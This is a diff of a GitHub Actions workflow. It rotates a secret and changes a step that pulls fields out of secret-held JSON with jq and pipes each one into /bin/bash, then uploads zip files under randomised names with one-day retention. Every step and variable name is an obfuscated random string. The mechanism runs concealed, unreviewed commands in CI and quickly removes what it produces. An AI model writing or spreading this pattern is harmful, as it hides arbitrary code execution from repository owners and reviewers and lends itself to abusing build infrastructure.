@@ -9,18 +9,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: kaydenvirtualn381
         env:
-          i1059: ${{ secrets.i1059 }}
+          sn8306: ${{ secrets.sn8306 }}
         run: |
-          printf '%s' "$i1059" | jq -r .oterm4 | /bin/bash
-          printf '%s' "$ikmb04486" | jq -r .gt79768 | /bin/bash
-          printf '%s' "$siril54481" | jq -r .y32 | /bin/bash
-          printf '%s' "$carm5" | jq -r .twd60 | /bin/bash
-          echo $nska1067 | jq -r .ibqn1 | /bin/bash
-          echo $rlgw1 | jq -r .xveb91 | /bin/bash
+          printf '%s' "$sn8306" | jq -r .t48247 | /bin/bash
+          printf '%s' "$liune62883" | jq -r .n19448 | /bin/bash
+          echo $d6 | jq -r .lr12 | /bin/bash
+          printf '%s' "$osaus7060" | jq -r .dcok3178 | /bin/bash
+          printf '%s' "$c43" | jq -r .ey59729 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: UDfgqOc8
+          name: 32lVJ6Dc
           path: "*.zip"
           retention-days: 1
